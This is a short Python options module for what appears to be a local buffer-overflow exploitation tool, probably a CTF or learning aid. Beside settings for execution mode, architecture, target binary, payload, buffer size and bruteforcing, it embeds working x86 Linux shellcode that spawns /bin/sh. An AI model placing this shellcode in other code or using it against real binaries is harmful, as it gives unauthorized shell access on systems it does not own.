#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from enum import Enum


class Mode(Enum):
    PIPED = 1
    ARG = 2


class BinType(Enum):
    THIRTY_TWO = 1
    SIXTY_FOUR = 2


class Option:
    execMode = Mode.PIPED
    binType = BinType.THIRTY_TWO
    shellcode = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    binPath = "./a.out"
    payload = ""
    buffSize = 0
    env = {}
    bruteforce = False

    def __init__(self, binPath = "./a.out"):
        self.binPath = binPath
